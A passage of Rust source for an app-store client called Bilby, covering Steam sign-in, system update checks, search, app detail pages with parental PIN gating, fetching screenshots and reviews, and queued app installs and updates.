                    Ok(Poll::Waiting { .. }) if since.elapsed().as_secs() > 300 => {
                        stop("Nobody scanned the code in five minutes. Try again when you are ready.")
                    }
                    Ok(Poll::Waiting { scanned }) => {
                        store.set_steam_qr_scanned(scanned);
                        if session.challenge_url != shown {
                            store.set_steam_qr(code_image(&session.challenge_url));
                        }
                        app.steam_qr_wait(session, generation, since);
                    }
                    Ok(Poll::Expired) => {
                        stop("The code ran out, or the sign-in was refused in the Steam app. Try again.")
                    }
                    Err(e) => stop(&e.to_string()),
                }
            },
        );
    }

    fn steam_ask(
        &self,
        via_longboard: bool,
        generation: u64,
    ) -> bilby_core::Result<Option<bilby_core::steam_account::Account>> {
        use bilby_core::steam_account;
        if !via_longboard {
            let line = (self.signin)(&self.dirs.config.join("steam-session"))?;
            return line
                .map(|line| {
                    steam_account::parse(&line).ok_or_else(|| Error::Parse("Steam's answer could not be read.".into()))
                })
                .transpose();
        }
        let longboard = install::find_longboard(&self.dirs).ok_or_else(|| {
            Error::Unsupported(
                "On a TV you sign in to Steam in Longboard, a browser for TVs, which is not installed yet. Install Longboard from this store, then try again.".into(),
            )
        })?;
        // The answer comes back as a file only this user can read, removed once read.
        let dir = self.dirs.cache.join("hand-back");
        std::fs::create_dir_all(&dir)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
        }
        let file = dir.join("steam.json");
        let _ = std::fs::remove_file(&file);
        (self.runner)(&longboard, &steam_account::longboard_args(&file))?;
        let going = || self.steam_generation.load(Ordering::SeqCst) == generation;
        let answer = steam_account::await_hand_back(&file, std::time::Duration::from_secs(600), &going);
        let _ = std::fs::remove_file(&file);
        answer
    }

    /// Stop waiting for a Steam sign-in, closing the sign-in window if it is open.
    pub fn steam_cancel(&self, ui: &AppWindow) {
        self.steam_generation.fetch_add(1, Ordering::SeqCst);
        if let Some(mut window) = SIGNIN_WINDOW.lock().unwrap().take() {
            let _ = window.kill();
            let _ = window.wait();
        }
        ui.global::<Store>().set_steam_state(0);
    }

    /// Forget the Steam account: what it owns, and the sign-in window's own data.
    pub fn steam_signout(&self, ui: &AppWindow) {
        self.steam_generation.fetch_add(1, Ordering::SeqCst);
        *self.steam.write().unwrap() = None;
        self.update_state(ui, |state| state.steam = None);
        let _ = std::fs::remove_dir_all(self.dirs.config.join("steam-session"));
        self.refresh_settings(ui);
        self.refresh(ui);
        self.toast(ui, "Signed out of Steam on this device", false);
    }

    /// Stop waiting for a sign-in.
    pub fn github_cancel(&self, ui: &AppWindow) {
        self.signin_generation.fetch_add(1, Ordering::SeqCst);
        let store = ui.global::<Store>();
        store.set_signin_state(0);
        store.set_signin_code(SharedString::new());
    }

    /// Keep the store's own app-menu entry in step with the setting: there, and pointing
    /// at the file it is running from, or gone.
    fn apply_menu_entry(&self, ui: &AppWindow) {
        let Some(program) = &self.self_program else { return };
        if self.state().settings.hide_from_menu {
            install::unregister_self(&self.dirs);
        } else if let Err(e) = install::register_self(&self.dirs, program, ICON_PNG) {
            self.toast(ui, &format!("Could not add Bilby to the app menu: {e}"), true);
        }
    }

    /// Fetch the lists the sources keep (what is popular on Flathub and the like) and
    /// add them to the home page. The page is usable before they arrive.
    pub fn load_collections(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        self.job(
            |app| app.catalog().collections(12),
            |app, ui, sections| {
                *app.collections.lock().unwrap() = sections;
                app.refresh(ui);
            },
        );
    }

    // ---- this device ----

    /// Put the system's details and the last look for updates on screen. `state` is
    /// what is going on right now: 0 for "as last found", 1 checking, 4 installing.
    fn show_system(&self, ui: &AppWindow, state: i32, log: &str) {
        let store = ui.global::<Store>();
        let report = &self.system;
        store.set_system_name(report.name.as_str().into());
        store.set_system_tagline(report.tagline.as_str().into());
        store.set_system_facts(ModelRc::new(VecModel::from(
            report
                .facts
                .iter()
                .map(|f| Fact { name: f.name.into(), value: f.value.as_str().into() })
                .collect::<Vec<_>>(),
        )));
        store.set_system_supported(!report.managers.is_empty());
        store.set_system_note(report.note.as_str().into());
        store.set_system_handoff(report.handoff.as_ref().map(|h| h.label).unwrap_or_default().into());
        if !log.is_empty() {
            store.set_system_log(log.into());
        }
        let check = self.system_check.lock().unwrap().clone();
        let pending = check.as_ref().map(|c| c.pending.clone()).unwrap_or_default();
        let rows: Vec<SystemUpdate> = pending
            .iter()
            .map(|p| SystemUpdate {
                name: p.name.as_str().into(),
                change: if p.from.is_empty() { p.to.clone() } else { format!("{} → {}", p.from, p.to) }.into(),
                via: p.manager.label().into(),
            })
            .collect();
        store.set_system_updates(ModelRc::new(VecModel::from(rows)));
        store.set_system_restart(check.as_ref().is_some_and(|c| c.restart_needed));
        let problems = check.as_ref().map(|c| c.problems.join(" ")).unwrap_or_default();
        let (state, headline) = match (state, &check) {
            (1, _) => (1, "Checking for updates…".to_string()),
            (4, _) => (4, "Installing updates…".to_string()),
            (_, None) => (0, "Not checked yet".to_string()),
            (_, Some(_)) if pending.len() == 1 => (3, "1 update available".to_string()),
            (_, Some(_)) if !pending.is_empty() => (3, format!("{} updates available", pending.len())),
            (_, Some(_)) if !problems.is_empty() => (5, "Could not check for updates".to_string()),
            (_, Some(c)) if c.restart_needed => (2, "Restart to finish updating".to_string()),
            (_, Some(_)) => (2, "Up to date".to_string()),
        };
        // Where a check relies on a list fetched earlier, say how old that list is.
        let age =
            check.as_ref().and_then(|c| c.lists_fetched).map(|then| match now_unix().saturating_sub(then) / 3600 {
                0 => "The list of updates was fetched within the last hour.".to_string(),
                hours if hours < 48 => format!("The list of updates was fetched {hours} hours ago."),
                hours => format!("The list of updates was fetched {} days ago, so there may be more.", hours / 24),
            });
        let detail =
            [problems, age.unwrap_or_default()].into_iter().filter(|t| !t.is_empty()).collect::<Vec<_>>().join(" ");
        store.set_system_state(state);
        store.set_system_headline(headline.into());
        store.set_system_detail(detail.into());
    }

    /// Look for system updates. A quiet check (`asked` false) never asks for a
    /// password. One the user asked for first fetches a fresh list of updates where the
    /// one on disk is more than a day old (apt), which does.
    pub fn check_system(self: &Arc<Self>, ui: &AppWindow, asked: bool) {
        if self.system.managers.is_empty() || matches!(ui.global::<Store>().get_system_state(), 1 | 4) {
            return;
        }
        self.show_system(ui, 1, "");
        let fetched = self.system_check.lock().unwrap().as_ref().and_then(|c| c.lists_fetched);
        let stale = asked && fetched.is_some_and(|then| now_unix().saturating_sub(then) > 86_400);
        self.job(
            move |app| {
                let refreshed = match stale {
                    true => bilby_core::os::refresh_lists(app.host.as_ref(), &app.system, &mut |_| {}),
                    false => Ok(()),
                };
                (refreshed, bilby_core::os::check(app.host.as_ref(), &app.system))
            },
            |app, ui, (refreshed, check)| {
                // The Library's card for the device says what was found.
                let after = app.clone();
                let weak = ui.as_weak();
                slint::Timer::single_shot(std::time::Duration::from_millis(0), move || {
                    if let Some(ui) = weak.upgrade() {
                        after.refresh(&ui);
                    }
                });
                *app.system_check.lock().unwrap() = Some(check);
                app.show_system(ui, 0, "");
                if let Err(e) = refreshed {
                    app.toast(ui, &e.to_string(), true);
                }
            },
        );
    }

    /// Install every waiting system update, then look again.
    pub fn update_system(self: &Arc<Self>, ui: &AppWindow) {
        if self.system.managers.is_empty() || matches!(ui.global::<Store>().get_system_state(), 1 | 4) {
            return;
        }
        self.show_system(ui, 4, "");
        self.job(
            |app| {
                let mut log = Vec::new();
                let result =
                    bilby_core::os::update(app.host.as_ref(), &app.system, &mut |line| log.push(line.to_string()));
                // Long output is cut from the top: the end is where a failure explains itself.
                let from = log.len().saturating_sub(300);
                (result, log[from..].join("\n"), bilby_core::os::check(app.host.as_ref(), &app.system))
            },
            |app, ui, (result, log, check)| {
                let restart = check.restart_needed;
                *app.system_check.lock().unwrap() = Some(check);
                app.show_system(ui, 0, if log.is_empty() { " " } else { &log });
                match result {
                    Ok(()) if restart => app.toast(ui, "Updates installed. Restart this device to finish.", false),
                    Ok(()) => app.toast(ui, "The system is up to date.", false),
                    Err(e) => app.toast(ui, &e.to_string(), true),
                }
            },
        );
    }

    /// Fetch star ratings in the background (at most once a day), unless turned off.
    pub fn load_ratings(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        if self.state().settings.hide_ratings {
            return;
        }
        self.job(
            |app| app.catalog().load_ratings(&app.dirs.cache),
            |app, ui, loaded| {
                if loaded {
                    app.refresh(ui);
                    let store = ui.global::<Store>();
                    if let Some(id) = AppId::parse(store.get_app().id.as_str()) {
                        let rating = app.catalog().rating_for(&id);
                        let mut card = store.get_app();
                        card.rating = rating.map(bilby_core::ratings::stars_text).unwrap_or_default().into();
                        card.rating_count = rating.map(|r| ratings_text(r.count)).unwrap_or_default().into();
                        card.rating_spread = rating.map(spread_shares).unwrap_or_default();
                        store.set_app(card);
                    }
                }
            },
        );
    }

    // ---- search ----

    /// While typing: instant matches from the bundled catalog. No network, no history.
    pub fn typing(&self, ui: &AppWindow, text: &str) {
        let store = ui.global::<Store>();
        let suggestions = self.catalog().suggest(text, 6);
        if !suggestions.is_empty() && !store.get_details_open() {
            store.set_page(1);
        }
        // Old results belong to the previous query; typing starts a new one.
        if store.get_searched() {
            store.set_searched(false);
            store.set_search_note(SharedString::new());
            store.set_search_error(SharedString::new());
            *self.results.lock().unwrap() = (String::new(), Vec::new());
            store.set_results(ModelRc::default());
        }
        store.set_suggestions(self.cards(&suggestions));
    }

    pub fn search(self: &Arc<Self>, ui: &AppWindow, query: &str) {
        let query = query.trim().to_string();
        if query.is_empty() {
            return;
        }
        // A pasted link or owner/repo goes straight to that app.
        // A new search starts unfiltered.
        *self.result_filter.lock().unwrap() = None;
        if let Some(id) = AppId::from_user_input(&query) {
            // A link opens even when its source is switched off: the person asked for it.
            if self.catalog().available_sources().contains(&id.source) {
                self.open(ui, &id.to_string());
                return;
            }
        }
        let store = ui.global::<Store>();
        if query.chars().count() < 2 {
            store.set_page(1);
            store.set_search_note("Type at least two characters.".into());
            return;
        }
        self.close_details(ui);
        store.set_page(1);
        store.set_searching(true);
        // What was on screen before (the home page's rows) goes now: the search page
        // waits, with its own animation, until the results come.
        store.set_results(ModelRc::default());
        store.set_tv_rows(ModelRc::default());
        store.set_search_note(SharedString::new());
        store.set_search_error(SharedString::new());
        self.update_state(ui, |state| state.add_search(&query));
        let generation = self.search_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let work_query = query.clone();
        self.job(
            move |app| app.catalog().search(&work_query),
            move |app, ui, outcome| {
                if app.search_generation.load(Ordering::SeqCst) == generation {
                    app.show_search(ui, &query, &outcome);
                }
            },
        );
    }

    fn show_search(&self, ui: &AppWindow, query: &str, outcome: &SearchOutcome) {
        let store = ui.global::<Store>();
        store.set_searching(false);
        store.set_searched(true);
        // The real results replace the as-you-type suggestions.
        store.set_suggestions(ModelRc::default());
        let mut note = if outcome.apps.is_empty() {
            String::new()
        } else {
            format!("{} for “{query}”.", plural(outcome.apps.len(), "app"))
        };
        if outcome.hidden > 0 {
            if !note.is_empty() {
                note.push(' ');
            }
            note.push_str(&format!("{} more matched but do not work on this device.", outcome.hidden));
        }
        store.set_search_note(note.into());
        store.set_search_error(outcome.errors.join("\n").into());
        *self.results.lock().unwrap() = (query.to_string(), outcome.apps.clone());
        self.refresh(ui);
    }

    // ---- details ----

    /// Install from a list. The app's page opens so what is happening can be seen and
    /// stopped, and the file that suits this device starts downloading as soon as it is
    /// known. Packages that are installed with a command just get their page.
    pub fn quick_install(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        *self.install_when_loaded.lock().unwrap() = Some(id.to_string());
        self.open(ui, id);
    }

    pub fn open(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        let store = ui.global::<Store>();
        if id == SYSTEM_CARD {
            store.set_details_open(false);
            store.set_page(4);
            return;
        }
        // Something for adults: ask first, once, or for the PIN; never in Family mode.
        let listed_adult = find_card(&store, id).is_some_and(|card| card.adult)
            || id.strip_prefix("web:").and_then(bilby_core::source::web::listed).is_some_and(|site| site.adult)
            || self.known_adult.lock().unwrap().contains(id);
        if listed_adult {
            use bilby_core::parental::Gate;
            self.known_adult.lock().unwrap().insert(id.to_string());
            match self.gate_for_adult() {
                Gate::Open => {}
                Gate::Blocked => {
                    self.toast(ui, "This is not available while Family mode is on.", true);
                    return;
                }
                Gate::ConfirmAdult => {
                    let waiting = Guarded::OpenAdult(id.to_string());
                    self.ask(ui, 1, "Adult content", "This is meant for adults. Are you 18 or over?", waiting);
                    return;
                }
                Gate::Pin => {
                    let waiting = Guarded::OpenAdult(id.to_string());
                    self.ask(
                        ui,
                        2,
                        "Enter the PIN",
                        "This is meant for adults, and a PIN guards it on this device.",
                        waiting,
                    );
                    return;
                }
            }
        }
        let generation = self.details_generation.fetch_add(1, Ordering::SeqCst) + 1;
        // Show what the list already knew while the releases load.
        let known = find_card(&store, id);
        store.set_is_favourite(self.state().is_favourite(id));
        store.set_can_open(self.launchable(id).is_some());
        store.set_in_library(self.state.lock().unwrap().installed(id).is_some());
        store.set_details_open(true);
        store.set_details_error(SharedString::new());
        store.set_unavailable(SharedString::new());
        store.set_warning(SharedString::new());
        store.set_notes(SharedString::new());
        show_links(&store);
        store.set_about(SharedString::new());
        show_links(&store);
        store.set_screenshots(ModelRc::default());
        store.set_reviews(ModelRc::default());
        store.set_release_date(SharedString::new());
        store.set_release_age(SharedString::new());
        store.set_license(SharedString::new());
        store.set_homepage(SharedString::new());
        store.set_options(ModelRc::default());
        store.set_hidden(ModelRc::default());
        store.set_install_state(0);
        store.set_installed_version(
            self.state.lock().unwrap().installed(id).map(|a| a.version.clone()).unwrap_or_default().into(),
        );
        store.set_versions(ModelRc::default());
        store.set_selected_version(0);
        *self.current.lock().unwrap() = Current { id: id.to_string(), details: None, selected: None };
        let mut card = known.unwrap_or_else(|| {
            let name = id.rsplit(['/', ':']).next().unwrap_or(id);
            AppCard {
                id: id.into(),
                name: name.into(),
                source: AppId::parse(id).map(|parsed| parsed.source.label()).unwrap_or_default().into(),
                initials: initials(name).into(),
                tint: tint_for(id),
                icon: picture_for(id),
                ..Default::default()
            }
        });
        // Library cards carry "old → new" as their version; the page shows the release's.
        card.version = SharedString::new();
        store.set_app(card);
        self.show_app_sources(ui);
        let Some(app_id) = AppId::parse(id) else {
            store.set_details_loading(false);
            store.set_details_error(format!("“{id}” is not an app id.").into());
            return;
        };
        store.set_details_loading(true);
        let about_id = app_id.clone();
        // Taken now, so it applies to this opening only and never to a later visit.
        let auto_install = self.install_when_loaded.lock().unwrap().take();
        self.job(
            move |app| app.catalog().details(&app_id).map_err(|e| e.to_string()),
            move |app, ui, result| {
                if app.details_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                match result {
                    Ok(details) => {
                        let id = details.summary.id.to_string();
                        app.show_details(ui, details);
                        app.load_about(about_id, generation);
                        // Asked for from a list: carry on to the install.
                        let direct = {
                            let current = app.current.lock().unwrap();
                            current
                                .release()
                                .and_then(|r| r.options.first())
                                .is_some_and(|o| o.plan.action != Action::ShowCommand)
                        };
                        if auto_install.as_deref() == Some(id.as_str()) && direct {
                            app.install(ui, 0);
                        }
                    }
                    Err(message) => {
                        let store = ui.global::<Store>();
                        store.set_details_loading(false);
                        store.set_details_error(message.into());
                    }
                }
            },
        );
    }

    /// Fetch the project's own description once the page is usable. It is extra: if it
    /// cannot be had (no README, offline, out of requests) the page simply has no
    /// About section.
    fn load_about(self: &Arc<Self>, id: AppId, generation: u64) {
        let key = bilby_core::icons::app_key(&id);
        let logo_known = PICTURES.with(|p| p.borrow().contains_key(&key));
        self.job(
            move |app| {
                let catalog = app.catalog();
                let http = catalog.http();
                let readme = catalog.about(&id).ok().flatten().unwrap_or_default();
                // Pictures are fetched and decoded here, off the interface's thread. The
                // source's own screenshots first (Flathub has them), else the README's.
                let mut urls = catalog.pictures(&id);
                if urls.is_empty() {
                    urls = bilby_core::screenshots::from_readme(&readme, &id);
                }
                let dir = app.dirs.cache.join("screenshots");
                let pictures = urls
                    .iter()
                    .filter_map(|url| bilby_core::screenshots::fetch(http.as_ref(), &dir, url).ok().flatten())
                    .filter_map(|path| decode_screenshot(&path))
                    .collect();
                // The project's own logo: what its README shows, else the usual places.
                let mut logo = None;
                if !logo_known && id.source == SourceKind::GitHub {
                    let icons = app.dirs.cache.join("icons");
                    let key = bilby_core::icons::app_key(&id);
                    let places = bilby_core::screenshots::logo_from_readme(&readme, &id)
                        .into_iter()
                        .chain(bilby_core::screenshots::usual_logo_places(&id));
                    for (n, url) in places.enumerate() {
                        // Each place is remembered separately, so a miss is not asked again.
                        let attempt = format!("{key}-try{n}");
                        if let Ok(Some(path)) =
                            bilby_core::icons::fetch_picture(http.as_ref(), &icons, &attempt, &url, 2 * 1024 * 1024)
                        {
                            // Kept under the app's own name, where lists look for it.
                            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("png").to_string();
                            let kept = icons.join(format!("{key}.{ext}"));
                            if std::fs::copy(&path, &kept).is_ok() {
                                logo = Some(kept);
                            }
                            break;
                        }
                    }
                }
                // What people wrote, for apps the ratings service knows; none otherwise.
                // Which apps it knows comes from the ratings file, so that is read first
                // (a page opened right at start-up would otherwise find none).
                if !app.state().settings.hide_ratings {
                    catalog.load_ratings(&app.dirs.cache);
                }
                let reviews = catalog.reviews(&id);
                (plain_about(&readme), pictures, logo, reviews)
            },
            move |app,
                  ui,
                  (about, pictures, logo, reviews): (
                String,
                Vec<slint::SharedPixelBuffer<slint::Rgba8Pixel>>,
                Option<PathBuf>,
                Vec<bilby_core::ratings::Review>,
            )| {
                if let Some(image) = logo.as_deref().and_then(decode_picture) {
                    PICTURES.with(|p| p.borrow_mut().insert(key.clone(), image));
                    app.refresh(ui);
                }
                if app.details_generation.load(Ordering::SeqCst) == generation {
                    let store = ui.global::<Store>();
                    store.set_about(about.into());
                    show_links(&store);
                    let images: Vec<slint::Image> = pictures.into_iter().map(slint::Image::from_rgba8).collect();
                    store.set_screenshots(ModelRc::new(VecModel::from(images)));
                    let rows: Vec<ReviewRow> = reviews
                        .iter()
                        .map(|r| {
                            let mut meta: Vec<String> = Vec::new();
                            if !r.author.is_empty() {
                                meta.push(r.author.clone());
                            }
                            if !r.date.is_empty() {
                                meta.push(r.date.clone());
                            }
                            if !r.version.is_empty() {
                                meta.push(format!("version {}", r.version));
                            }
                            ReviewRow {
                                stars: format!("{}{}", "★".repeat(r.stars as usize), "☆".repeat(5 - r.stars as usize))
                                    .into(),
                                title: r.title.as_str().into(),
                                text: r.text.as_str().into(),
                                meta: meta.join("  ·  ").into(),
                            }
                        })
                        .collect();
                    store.set_reviews(ModelRc::new(VecModel::from(rows)));
                    let mut card = store.get_app();
                    card.icon = picture_for(&card.id);
                    store.set_app(card);
                }
            },
        );
    }

    fn show_details(&self, ui: &AppWindow, details: AppDetails) {
        let store = ui.global::<Store>();
        store.set_details_loading(false);
        // The list's display name ("Tidewave") reads better than the repository's ("tidewave").
        // Something for adults that was opened by its link, not chosen from a covered
        // tile: it is closed again, and the question is asked when it is next opened.
        if details.summary.adult && self.gate_for_adult() != bilby_core::parental::Gate::Open {
            self.known_adult.lock().unwrap().insert(details.summary.id.to_string());
            store.set_details_open(false);
            store.invoke_open(details.summary.id.to_string().into());
            return;
        }
        let mut card = self.card_open(&details.summary);
        let shown = store.get_app();
        if shown.id == card.id && !shown.name.is_empty() && !shown.author.is_empty() && !shown.adult {
            card.name = shown.name;
            card.initials = shown.initials;
            // What the list already knew is kept when the app's own page does not repeat it.
            if card.popularity.is_empty() {
                card.popularity = shown.popularity;
            }
            if card.headline.is_empty() {
                card.headline = shown.headline;
            }
            card.verified |= shown.verified;
        }
        store.set_app(card);
        store.set_license(details.summary.license.clone().unwrap_or_default().into());
        store.set_homepage(details.summary.homepage.as_str().into());
        store.set_unavailable(details.unavailable_reason.clone().unwrap_or_default().into());
        store.set_versions(ModelRc::new(VecModel::from(
            details.versions.iter().map(|r| SharedString::from(&r.version)).collect::<Vec<_>>(),
        )));
        // Installed with a command the person runs: AUR and repository packages. Flathub
        // apps are installed for them, so they read like any other app.
        store.set_is_package(matches!(
            details.summary.id.source,
            SourceKind::Aur
                | SourceKind::Pacman
                | SourceKind::Apt
                | SourceKind::Dnf
                | SourceKind::Zypper
                | SourceKind::Web
                | SourceKind::Snap
                | SourceKind::Winget
        ));
        store.set_is_website(details.summary.id.source == SourceKind::Web);
        // What the system's package manager has, when the store's own library has nothing.
        if store.get_installed_version().is_empty() {
            store.set_installed_version(details.summary.installed_version.clone().unwrap_or_default().into());
        }
        // Start on the release the catalog picked (the newest stable one that fits).
        let picked = details.release.as_ref().map(|r| r.version.clone());
        let selected = details.versions.iter().position(|r| Some(&r.version) == picked.as_ref());
        {
            let mut current = self.current.lock().unwrap();
            current.details = Some(details);
            current.selected = selected;
        }
        self.show_release(ui);
    }

    /// Fill the page from the release that is currently selected.
    fn show_release(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let current = self.current.lock().unwrap();
        let Some(details) = current.details.as_ref() else { return };
        let release = current.release();
        let (options, hidden, notes, date) = match release {
            Some(r) => (r.options.clone(), r.hidden.clone(), plain_notes(&r.notes), r.published.clone()),
            None => (vec![], vec![], String::new(), String::new()),
        };
        store.set_selected_version(current.selected.unwrap_or(0) as i32);
        let mut card = store.get_app();
        card.version = release.map(|r| r.version.as_str()).unwrap_or_default().into();
        card.badge = options.first().map(|o| o.label()).unwrap_or_default().into();
        store.set_app(card);
        store.set_install_state(0);
        store.set_options(ModelRc::new(VecModel::from(options.iter().map(option_row).collect::<Vec<_>>())));
        // Now that the kind of file is known: does this system have what it needs?
        self.show_app_sources(ui);
        store.set_hidden(ModelRc::new(VecModel::from(
            hidden
                .iter()
                .map(|h| HiddenRow { file: h.name.clone().into(), reason: h.reason.clone().into() })
                .collect::<Vec<_>>(),
        )));
        store.set_notes(notes.into());
        show_links(&store);
        // Things worth knowing before installing, most important first.
        let age = age_label(&date, now_unix());
        let mut warnings: Vec<String> = details.summary.warning.clone().into_iter().collect();
        if details.summary.id.source == SourceKind::Web
            && self.opens_sites_in_longboard()
            && install::find_longboard(&self.dirs).is_none()
        {
            warnings.push("Websites open in Longboard, a browser for TVs, which is not installed yet. Install Longboard first: it is under Made for TV.".to_string());
        }
        let newest = details.versions.first().map(|r| r.version.as_str());
        let is_newest = release.map(|r| r.version.as_str()) == newest;
        if let (false, Some(newest)) = (is_newest, newest) {
            warnings.push(format!("This is an older version. The newest for this device is {newest}."));
        }
        if release.is_some_and(|r| r.prerelease && !r.options.is_empty()) {
            warnings.push("This is a pre-release. It may be unfinished or unstable.".to_string());
        }
        if let (true, Some(years)) = (is_newest, age.strip_suffix(" years ago").and_then(|n| n.parse::<u32>().ok())) {
            warnings.push(format!("The latest release is {years} years old. The project may no longer be maintained."));
        }
        store.set_warning(warnings.join("\n").into());
        store.set_release_age(age.into());
        store.set_release_date(date.into());
    }

    pub fn select_version(&self, ui: &AppWindow, index: i32) {
        {
            let mut current = self.current.lock().unwrap();
            let count = current.details.as_ref().map(|d| d.versions.len()).unwrap_or(0);
            if index < 0 || index as usize >= count || ui.global::<Store>().get_install_state() == 1 {
                return;
            }
            current.selected = Some(index as usize);
        }
        self.show_release(ui);
    }

    pub fn close_details(&self, ui: &AppWindow) {
        // Invalidate any details request still in flight.
        self.details_generation.fetch_add(1, Ordering::SeqCst);
        ui.global::<Store>().set_details_open(false);
    }

    // ---- install ----

    /// Update every library app that has an update waiting, one after another. A failure
    /// is reported and the rest carry on.
    pub fn update_all(self: &Arc<Self>, ui: &AppWindow) {
        if !ui.global::<Store>().get_updating_id().is_empty() {
            return;
        }
        let waiting: Vec<String> = {
            let updates = self.updates.lock().unwrap();
            self.state()
                .library
                .iter()
                .filter(|app| matches!(updates.get(&app.id), Some(UpdateStatus::Available { .. })))
                .map(|app| app.id.clone())
                .collect()
        };
        *self.update_queue.lock().unwrap() = waiting.into();
        self.update_next(ui);
    }

    /// Start the next queued update, if any and if nothing is running.
    fn update_next(self: &Arc<Self>, ui: &AppWindow) {
        let store = ui.global::<Store>();
        while store.get_updating_id().is_empty() && store.get_install_state() != 1 {
            let Some(id) = self.update_queue.lock().unwrap().pop_front() else { return };
            self.update_app(ui, &id);
        }
    }

    /// Update a library app in place: look up its newest release for this device and
    /// install the best option, without leaving the Library page.
    pub fn update_app(self: &Arc<Self>, ui: &AppWindow, id: &str) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 || !store.get_updating_id().is_empty() {
            return;
        }
        let Some(app_id) = AppId::parse(id) else { return };
        let Some(entry) = self.state.lock().unwrap().installed(id).cloned() else { return };
        store.set_updating_id(id.into());
        store.set_install_progress(0.0);
        let id = id.to_string();
        self.job(
            move |app| app.catalog().details(&app_id).map_err(|e| e.to_string()),
            move |app, ui, result| {
                let store = ui.global::<Store>();
                let fail = |message: String| {
                    store.set_updating_id(SharedString::new());
                    app.toast(ui, &message, true);
                    app.update_next(ui);
                };
                let details = match result {
                    Ok(details) => details,
                    Err(e) => return fail(format!("Couldn't update {}: {e}", entry.name)),
                };
                let Some(picked) =
                    details.release.as_ref().filter(|r| !r.options.is_empty()).map(|r| r.version.clone())
                else {
                    return fail(format!("{} no longer has a file for this device", entry.name));
                };
                let selected = details.versions.iter().position(|r| r.version == picked);
                // The install step reads the app in focus; make it this one.
                store.set_app(app.library_card(&entry));
                *app.current.lock().unwrap() = Current { id, details: Some(details), selected };
                app.install(ui, 0);
                // Nothing started (should not happen once an option exists): do not get stuck.
                if store.get_install_state() == 0 && !store.get_updating_id().is_empty() {
                    store.set_updating_id(SharedString::new());
                }
            },
        );
    }

    /// Fetch a file the store would not install on this device. It is checked like any
    /// other download and shown in the downloads folder; nothing is run or recorded.
    pub fn download_hidden(self: &Arc<Self>, ui: &AppWindow, index: i32) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 {
            return;
        }
        let asset = {
            let current = self.current.lock().unwrap();
            let Some(release) = current.release() else { return };
            let Some(hidden) = release.hidden.get(index.max(0) as usize) else { return };
            hidden.asset.clone()
        };
        // Past any real option's index, so no install button takes it for its own.
        store.set_install_index(HIDDEN_BASE + index);
        store.set_install_state(1);
        store.set_install_progress(0.0);
        self.cancel_install.store(false, Ordering::SeqCst);
        let cancel = self.cancel_install.clone();
        self.job(
            move |app| {
                let http = app.catalog().http();
                let mut progress = |_: u64, _: Option<u64>| !cancel.load(Ordering::SeqCst);
                install::execute(
                    &install::save_only(),
                    &asset,
                    http.as_ref(),
                    &app.dirs_for_download(),
                    app.opener.as_ref(),
                    &mut progress,
                )
            },
            |app, ui, result| {
                ui.global::<Store>().set_install_state(0);
                match result {
                    Ok(outcome) => app.toast(ui, &outcome.message, false),
                    Err(Error::Cancelled) => app.toast(ui, "Download cancelled", false),
                    Err(e) => app.toast(ui, &format!("Download failed: {e}"), true),
                }
            },
        );
    }

    pub fn install(self: &Arc<Self>, ui: &AppWindow, index: i32) {
        let store = ui.global::<Store>();
        if store.get_install_state() == 1 {
            return;
        }
        if self.needs_pin_to_install() {
            let why = "A PIN is needed to install or remove apps on this device.";
            self.ask(ui, 2, "Enter the PIN", why, Guarded::Install(index));
            return;
        }
        // "Ask where to save each download": now, before anything is fetched.
        let action = {
            let current = self.current.lock().unwrap();
            current.release().and_then(|r| r.options.get(index.max(0) as usize).map(|o| o.plan.action.clone()))
        };
        if action.is_some_and(|action| !self.ask_where_to_save(&action)) {
            return;
        }
        let (details, option, version) = {
            let current = self.current.lock().unwrap();
            let Some(details) = current.details.clone() else { return };
            let Some(release) = current.release() else { return };
            let Some(option) = release.options.get(index.max(0) as usize).cloned() else { return };
            (details, option, release.version.clone())
        };
        store.set_install_index(index);
        store.set_install_state(1);
        store.set_install_progress(0.0);
        store.set_install_message(SharedString::new());
        self.cancel_install.store(false, Ordering::SeqCst);

        let cancel = self.cancel_install.clone();
        let inline = self.inline;
        let weak = self.ui.clone();
        let work_option = option.clone();
        // What it needs first (FUSE, for an AppImage) is installed first, as part of this.
        let placing = option.plan.action == Action::PlaceAppImage;
        let requirement = if placing { self.needed.lock().unwrap().clone() } else { None };
        let lacks_fuse = placing && self.lacks_fuse.load(Ordering::SeqCst);
        let layering = if lacks_fuse { self.layering.clone() } else { None };
        self.job(
            move |app| {
                // FUSE from the system's repositories where it can be had. Where it
                // cannot (no such package, or the install did not go through), the app
                // is unpacked instead, which needs none. Either way the person is not
                // sent to do anything.
                let mut unpack = lacks_fuse && requirement.is_none() && layering.is_none();
                if let Some(package) = &requirement {
                    unpack = app.install_requirement(package).is_err();
                }
                let mut last_percent = 0u64;
                let mut progress = |done: u64, total: Option<u64>| {
                    if let Some(total) = total.filter(|t| *t > 0) {
                        let percent = done * 100 / total;
                        // One UI update per percent is plenty.
                        if percent != last_percent {
                            last_percent = percent;
                            let set =
                                move |ui: AppWindow| ui.global::<Store>().set_install_progress(percent as f32 / 100.0);
                            if inline {
                                if let Some(ui) = weak.upgrade() {
                                    set(ui);
                                }
                            } else {
                                let weak = weak.clone();
                                let _ = slint::invoke_from_event_loop(move || {
                                    if let Some(ui) = weak.upgrade() {
                                        set(ui);
                                    }
                                });
                            }
                        }
                    }
                    !cancel.load(Ordering::SeqCst)
                };
                let http = app.catalog().http();
                let mut outcome = install::execute(
                    &work_option.plan,
                    &work_option.asset,
                    http.as_ref(),
                    &app.dirs_for_download(),
                    app.opener.as_ref(),
                    &mut progress,
                )?;
                // On a read-only system, once the file is here and is seen to need it:
                // FUSE is added on top of the image, to work from the next restart.
                if let (Some(tool), Some(file)) = (&layering, outcome.file.as_ref()) {
                    if bilby_core::needs::wants_fuse_library(file) != Some(false) {
                        match app.stage_fuse(tool) {
                            true => {
                                outcome.message = format!(
